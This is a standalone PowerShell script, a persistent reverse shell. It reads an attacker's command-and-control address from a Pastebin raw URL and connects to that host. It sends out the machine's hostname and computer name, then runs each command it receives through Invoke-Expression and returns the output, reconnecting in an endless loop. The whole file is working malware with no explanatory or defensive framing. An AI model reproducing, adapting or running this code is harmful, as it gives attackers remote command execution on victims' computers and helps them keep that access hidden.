# Persistent Reverse Shell with Pastebin Fallback
$pastebinUrl = "https://pastebin.com/raw/F4fUrSeS"
$checkInterval = 30
$connected = $false
$currentServer = $null

function Test-ConnectionWithTimeout {
    param($server, $timeout = 5)
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connectAsync = $tcpClient.ConnectAsync($server.Split(':')[0], [int]$server.Split(':')[1])
        if ($connectAsync.Wait($timeout * 1000)) {
            $tcpClient.Close()
            return $true
        }
        $tcpClient.Close()
        return $false
    }
    catch {
        return $false
    }
}

function Get-ServerFromPastebin {
    try {
        $response = Invoke-WebRequest -Uri $pastebinUrl -UseBasicParsing -TimeoutSec 10
        if ($response.StatusCode -eq 200) {
            $server = $response.Content.Trim()
            if ($server -match '^[a-zA-Z0-9.-]+\:[0-9]+$') {
                return $server
            }
        }
    }
    catch {
        Write-Host "[!] Pastebin fetch failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    return $null
}

function Invoke-ReverseShell {
    param($server)
    
    try {
        $serverParts = $server.Split(':')
        $hostName = $serverParts[0]
        $port = [int]$serverParts[1]
        
        $client = New-Object System.Net.Sockets.TcpClient($hostName, $port)
        $stream = $client.GetStream()
        $buffer = New-Object byte[] 4096
        $encoding = [System.Text.Encoding]::ASCII
        
        # Send initial connection info
        $info = "Windows PowerShell | $([System.Net.Dns]::GetHostName()) | $env:COMPUTERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $infoBytes = [System.Text.Encoding]::ASCII.GetBytes($info + "`n")
        $stream.Write($infoBytes, 0, $infoBytes.Length)
        
        while (($client.Connected) -and (Test-ConnectionWithTimeout $server 2)) {
            # Read command from C2
            $readBytes = $stream.Read($buffer, 0, $buffer.Length)
            if ($readBytes -eq 0) { break }
            
            $command = $encoding.GetString($buffer, 0, $readBytes).Trim()
            if ($command -eq "exit") { break }
            
            # Execute command
            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                if (-not $output) { $output = "[No output]`n" }
            }
            catch {
                $output = "Error: $($_.Exception.Message)`n"
            }
            
            # Send output back
            $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
            $stream.Write($outputBytes, 0, $outputBytes.Length)
            $stream.Flush()
        }
    }
    catch {
        Write-Host "[!] Shell error: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        if ($client) { $client.Close() }
    }
}

# Main persistence loop
Write-Host "[+] Persistent Reverse Shell Started" -ForegroundColor Green
Write-Host "[+] Pastebin: $pastebinUrl" -ForegroundColor Cyan
Write-Host "[+] Check interval: ${checkInterval}s" -ForegroundColor Cyan

while ($true) {
    try {
        if (-not $connected -or -not $currentServer -or -not (Test-ConnectionWithTimeout $currentServer)) {
            Write-Host "[*] Checking pastebin for C2 server..." -ForegroundColor Yellow
            $currentServer = Get-ServerFromPastebin
            
            if ($currentServer) {
                Write-Host "[+] Found C2: $currentServer" -ForegroundColor Green
                $connected = $true
                Invoke-ReverseShell $currentServer
                $connected = $false
                Write-Host "[!] Connection lost, retrying..." -ForegroundColor Red
            }
            else {
                Write-Host "[!] No valid server in pastebin, retrying..." -ForegroundColor Yellow
            }
        }
        else {
            Write-Host "[*] Already connected, maintaining..." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] Loop error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Start-Sleep $checkInterval
}
